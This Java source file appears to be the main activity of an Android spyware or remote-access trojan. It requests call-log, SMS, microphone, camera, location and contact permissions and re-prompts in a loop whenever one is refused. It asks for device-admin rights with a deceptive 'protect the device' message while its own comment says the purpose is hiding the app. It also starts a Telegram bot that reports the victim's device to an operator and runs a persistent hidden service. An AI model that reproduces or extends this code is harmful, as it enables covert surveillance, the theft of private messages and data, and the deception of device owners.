package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.receivers.AdminReceiver;
import com.alzahra.services.CoreService;
import com.alzahra.telegram.TelegramArabicBot;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_ALL = 1001;
    private static final int REQ_NOTIFICATION = 1002;
    private static final int REQ_STORAGE = 1003;
    private static final int REQ_ADMIN = 1004;
    
    private TelegramArabicBot bot;
    private SharedPreferences prefs;
    
    private final String[] PERMISSIONS = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.PROCESS_OUTGOING_CALLS,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate started");
        
        prefs = getSharedPreferences("alzahra_settings", MODE_PRIVATE);
        
        // Check if app is hidden
        if (prefs.getBoolean("app_hidden", false)) {
            finish();
            return;
        }
        
        // Initialize bot
        bot = new TelegramArabicBot(this);
        bot.start();
        
        // Start permission check flow
        checkPermissions();
    }

    private void checkPermissions() {
        List<String> needed = new ArrayList<>();
        
        for (String permission : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(permission);
            }
        }
        
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                needed.toArray(new String[0]), PERMISSION_ALL);
        } else {
            checkSpecialPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, 
            String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_ALL) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                checkSpecialPermissions();
            } else {
                // Retry after delay
                new Handler(Looper.getMainLooper())
                    .postDelayed(this::checkPermissions, 1500);
            }
        }
    }

    private void checkSpecialPermissions() {
        // Check notification access
        if (!isNotificationAccessGranted()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivityForResult(intent, REQ_NOTIFICATION);
            return;
        }
        
        // Check storage manager (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, REQ_STORAGE);
                return;
            }
        }
        
        // Check device admin for app hiding
        DevicePolicyManager dpm = (DevicePolicyManager) 
            getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "يرجى تفعيل صلاحية المسؤول لحماية الجهاز");
            startActivityForResult(intent, REQ_ADMIN);
            return;
        }
        
        // All permissions granted - start service
        startServiceAndFinish();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Re-check permissions
        checkSpecialPermissions();
    }

    private boolean isNotificationAccessGranted() {
        String enabled = Settings.Secure.getString(getContentResolver(), 
            "enabled_notification_listeners");
        return enabled != null && enabled.contains(getPackageName());
    }

    private void startServiceAndFinish() {
        // Start core service
        Intent serviceIntent = new Intent(this, CoreService.class);
        ContextCompat.startForegroundService(this, serviceIntent);
        
        // Notify bot
        bot.sendStatusMessage("✅ **تم التفعيل بنجاح**\\n📱 " + Build.MODEL + 
            "\\n⚡ Android " + Build.VERSION.RELEASE);
        
        Toast.makeText(this, "جاري التحميل...", Toast.LENGTH_SHORT).show();
        
        // Finish after delay
        new Handler(Looper.getMainLooper()).postDelayed(this::finish, 2500);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Keep bot running
    }
}
